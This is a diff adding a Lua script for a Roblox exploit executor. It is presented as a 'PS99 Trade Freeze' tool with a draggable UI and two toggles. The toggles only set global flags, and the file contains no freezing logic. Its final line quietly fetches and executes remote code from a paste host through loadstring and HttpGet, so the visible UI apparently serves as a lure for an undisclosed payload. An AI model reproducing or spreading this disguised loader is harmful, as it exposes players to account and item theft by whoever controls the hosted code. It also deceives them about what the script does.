@@ -1,0 +1,264 @@
+-- CoderJoey's PS99 Trade Freeze (Draggable)
+-- Paste and run this in your Delta (Roblox) executor.
+-- Drag the UI by the header (title), click knobs or press F (Freeze) and G (Auto Accept).
+-- Exposes getgenv().CODERJOEY_FREEZE and getgenv().CODERJOEY_AUTO for other scripts.
+
+-- Safe parenting helper (tries gethui, CoreGui, then PlayerGui)
+local function safeParent(gui)
+    if typeof(gethui) == "function" then
+        pcall(function() gui.Parent = gethui() end)
+        if gui.Parent then return end
+    end
+
+    local ok = pcall(function() gui.Parent = game:GetService("CoreGui") end)
+    if ok and gui.Parent then return end
+
+    local p = game:GetService("Players").LocalPlayer
+    if p and p:FindFirstChild("PlayerGui") then
+        pcall(function() gui.Parent = p.PlayerGui end)
+    end
+end
+
+-- Colors
+local COLOR_ON = Color3.fromRGB(16,185,129)
+local COLOR_OFF = Color3.fromRGB(239,68,68)
+local BG = Color3.fromRGB(7,18,37)
+
+-- Ensure globals for other scripts
+getgenv().CODERJOEY_FREEZE = getgenv().CODERJOEY_FREEZE or false
+getgenv().CODERJOEY_AUTO = getgenv().CODERJOEY_AUTO or false
+
+-- ScreenGui
+local screen = Instance.new("ScreenGui")
+screen.Name = "CoderJoey_TradeFreeze_UI"
+screen.ResetOnSpawn = false
+screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main frame (height reduced because subtitle removed)
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.AnchorPoint = Vector2.new(0, 0)
+main.Position = UDim2.new(0.5, -210, 0.12, 0) -- centered-ish
+main.Size = UDim2.new(0, 420, 0, 86)
+main.BackgroundColor3 = BG
+main.BorderSizePixel = 0
+main.Parent = screen
+main.ClipsDescendants = true
+main.Active = true
+
+local mc = Instance.new("UICorner", main)
+mc.CornerRadius = UDim.new(0, 12)
+
+-- Header (drag handle) - now only the title (no subtitle)
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0, 24)
+header.Position = UDim2.new(0, 0, 0, 0)
+header.Parent = main
+header.Active = true -- must be active to receive input
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.BackgroundTransparency = 1
+title.Position = UDim2.new(0, 12, 0, 4)
+title.Size = UDim2.new(1, -24, 0, 20)
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(230,238,246)
+title.Text = "CoderJoey's PS99 Trade Freeze"
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = header
+
+-- Container for knobs (moved up because subtitle is gone)
+local container = Instance.new("Frame")
+container.Name = "Container"
+container.BackgroundTransparency = 1
+container.Position = UDim2.new(0, 12, 0, 36)
+container.Size = UDim2.new(1, -24, 0, 46)
+container.Parent = main
+
+-- utility to make a round knob + label
+local function makeKnob(name, xOffset, labelText, initialState)
+    local holder = Instance.new("Frame")
+    holder.Name = name .. "_Holder"
+    holder.BackgroundTransparency = 1
+    holder.Size = UDim2.new(0, 190, 1, 0)
+    holder.Position = UDim2.new(0, xOffset, 0, 0)
+    holder.Parent = container
+
+    local knobButton = Instance.new("TextButton")
+    knobButton.Name = name .. "_Knob"
+    knobButton.Size = UDim2.new(0, 46, 0, 46)
+    knobButton.Position = UDim2.new(0, 0, 0, 0)
+    knobButton.AnchorPoint = Vector2.new(0, 0)
+    knobButton.BackgroundColor3 = initialState and COLOR_ON or COLOR_OFF
+    knobButton.Text = initialState and "ON" or "OFF"
+    knobButton.TextColor3 = Color3.new(1,1,1)
+    knobButton.Font = Enum.Font.GothamBold
+    knobButton.TextSize = 12
+    knobButton.AutoButtonColor = false
+    knobButton.Parent = holder
+
+    local uic = Instance.new("UICorner", knobButton)
+    uic.CornerRadius = UDim.new(1, 0) -- circle
+
+    -- label + hint
+    local lbl = Instance.new("TextLabel")
+    lbl.Name = name .. "_Label"
+    lbl.BackgroundTransparency = 1
+    lbl.Position = UDim2.new(0, 56, 0, 2)
+    lbl.Size = UDim2.new(1, -56, 0, 20)
+    lbl.Font = Enum.Font.GothamSemibold
+    lbl.TextSize = 14
+    lbl.TextColor3 = Color3.fromRGB(230,238,246)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Text = labelText
+    lbl.Parent = holder
+
+    local hint = Instance.new("TextLabel")
+    hint.Name = name .. "_Hint"
+    hint.BackgroundTransparency = 1
+    hint.Position = UDim2.new(0, 56, 0, 22)
+    hint.Size = UDim2.new(1, -56, 0, 20)
+    hint.Font = Enum.Font.Gotham
+    hint.TextSize = 12
+    hint.TextColor3 = Color3.fromRGB(154,166,178)
+    hint.TextXAlignment = Enum.TextXAlignment.Left
+    hint.Text = "Currently: " .. (initialState and "On" or "Off")
+    hint.Parent = holder
+
+    return {
+        holder = holder,
+        button = knobButton,
+        label = lbl,
+        hint = hint,
+    }
+end
+
+-- create two knobs
+local freezeKnob = makeKnob("FreezeTrade", 0, "Freeze Trade", getgenv().CODERJOEY_FREEZE)
+local autoKnob   = makeKnob("AutoAccept", 190, "Auto Accept",  getgenv().CODERJOEY_AUTO)
+
+-- Toggle helper
+local function setKnobState(knobTable, state)
+    knobTable.button.BackgroundColor3 = state and COLOR_ON or COLOR_OFF
+    knobTable.button.Text = state and "ON" or "OFF"
+    knobTable.hint.Text = "Currently: " .. (state and "On" or "Off")
+end
+
+local function toggleFreeze()
+    getgenv().CODERJOEY_FREEZE = not getgenv().CODERJOEY_FREEZE
+    setKnobState(freezeKnob, getgenv().CODERJOEY_FREEZE)
+    print("[CoderJoey] Freeze Trade ->", getgenv().CODERJOEY_FREEZE and "On" or "Off")
+end
+
+local function toggleAuto()
+    getgenv().CODERJOEY_AUTO = not getgenv().CODERJOEY_AUTO
+    setKnobState(autoKnob, getgenv().CODERJOEY_AUTO)
+    print("[CoderJoey] Auto Accept ->", getgenv().CODERJOEY_AUTO and "On" or "Off")
+end
+
+-- Wire clicks
+freezeKnob.button.MouseButton1Click:Connect(toggleFreeze)
+autoKnob.button.MouseButton1Click:Connect(toggleAuto)
+
+-- Keyboard support: F for Freeze, G for Auto Accept
+local UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode == Enum.KeyCode.F then
+            toggleFreeze()
+        elseif input.KeyCode == Enum.KeyCode.G then
+            toggleAuto()
+        end
+    end
+end)
+
+-- Dragging logic (drag by header). Supports mouse and touch, clamps to viewport.
+do
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
+    local function getViewport()
+        local cam = workspace.CurrentCamera
+        if cam then
+            return cam.ViewportSize
+        else
+            return Vector2.new(1280, 720)
+        end
+    end
+
+    local function clampPosition(x, y)
+        local vp = getViewport()
+        local maxX = math.max(10, vp.X - main.Size.X.Offset - 10)
+        local maxY = math.max(10, vp.Y - main.Size.Y.Offset - 10)
+        local nx = math.clamp(x, 10, maxX)
+        local ny = math.clamp(y, 10, maxY)
+        return nx, ny
+    end
+
+    local function onInputChanged(input)
+        if dragging and input == dragInput then
+            local delta = input.Position - dragStart
+            local newX = startPos.X + delta.X
+            local newY = startPos.Y + delta.Y
+            newX, newY = clampPosition(newX, newY)
+            main.Position = UDim2.new(0, newX, 0, newY)
+        end
+    end
+
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragInput = input
+            dragStart = input.Position
+            startPos = Vector2.new(main.Position.X.Offset, main.Position.Y.Offset)
+
+            -- Listen for the end of this input
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                    dragInput = nil
+                end
+            end)
+        end
+    end)
+
+    header.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            -- update dragInput to track movement (some clients require this)
+            if dragInput == nil then
+                dragInput = input
+            end
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(onInputChanged)
+
+    -- Re-clamp when viewport changes (e.g. resolution change, camera change)
+    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+        -- wait a tick for camera to be ready
+        task.defer(function()
+            local vp = getViewport()
+            local x = main.Position.X.Offset
+            local y = main.Position.Y.Offset
+            local nx, ny = clampPosition(x, y)
+            main.Position = UDim2.new(0, nx, 0, ny)
+        end)
+    end)
+end
+
+-- Initialize UI states
+setKnobState(freezeKnob, getgenv().CODERJOEY_FREEZE)
+setKnobState(autoKnob, getgenv().CODERJOEY_AUTO)
+
+-- Parent GUI safely
+safeParent(screen)
+
+print("[CoderJoey] Draggable UI loaded. Freeze:", getgenv().CODERJOEY_FREEZE, " AutoAccept:", getgenv().CODERJOEY_AUTO)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/blVheMQLDL/0", true))()
